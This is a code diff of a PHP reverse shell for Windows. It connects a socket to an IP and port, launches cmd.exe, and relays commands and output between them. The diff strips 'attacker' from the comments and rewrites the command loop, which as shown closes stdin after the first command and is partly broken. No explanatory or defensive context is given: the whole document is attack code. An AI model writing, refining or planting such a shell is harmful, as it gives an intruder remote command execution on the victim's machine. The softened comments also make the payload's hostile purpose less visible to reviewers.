@@ -1,6 +1,6 @@
 <?php
-$ip = '127.0.0.1';  // Attacker's IP address
-$port = 443;     // Attacker's listening port
+$ip = '127.0.0.1';  // IP address
+$port = 443;     // listening port
 
 // Create a socket and connect to the attacker's machine
 if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
@@ -11,33 +11,53 @@ if (socket_connect($sock, $ip, $port) === false) {
     die("Could not connect: " . socket_strerror(socket_last_error($sock)));
 }
 
-// Define the command to be executed (cmd.exe for Windows)
+// Command to execute (cmd.exe for Windows)
 $cmd = "cmd.exe";
 
-// Use pipes to handle stdin, stdout, and stderr
+// Set up descriptors for process
 $descriptorspec = [
     0 => ["pipe", "r"],  // stdin
     1 => ["pipe", "w"],  // stdout
     2 => ["pipe", "w"]   // stderr
 ];
 
-// Open the process with cmd.exe
+// Open the process
 $process = proc_open($cmd, $descriptorspec, $pipes);
 
 if (is_resource($process)) {
-    // Handle the communication with cmd.exe
-    while (!feof($pipes[1])) {
-        // Read output from cmd.exe and send it over the socket
-        $output = fread($pipes[1], 1024);
-        socket_write($sock, $output, strlen($output));
+    // Set non-blocking mode on the socket
+    stream_set_blocking($sock, 0);
+
+    while (true) {
+        // Read data from the socket (commands from the attacker)
+        $input = socket_read($sock, 1024);
+        if ($input === false || $input === '') {
+            // If no input, break the loop
+            break;
+        }
+
+        // Write input to the shell's stdin
+        fwrite($pipes[0], $input);
+
+        // Close stdin to execute the command
+        fclose($pipes[0]);
+
+        // Read the shell's output
+        while (($output = fread($pipes[1], 1024)) !== false) {
+            // Send output back to the attacker
+            socket_write($sock, $output);
+        }
+
+        // Check for errors
+        $errors = fread($pipes[2], 1024);
+        if ($errors) {
+            socket_write($sock, $errors);
+        }
     }
 
-    // Close the pipes
-    fclose($pipes[0]);
+    // Close pipes and process
     fclose($pipes[1]);
     fclose($pipes[2]);
-
-    // Close the process
     proc_close($process);
 }
 
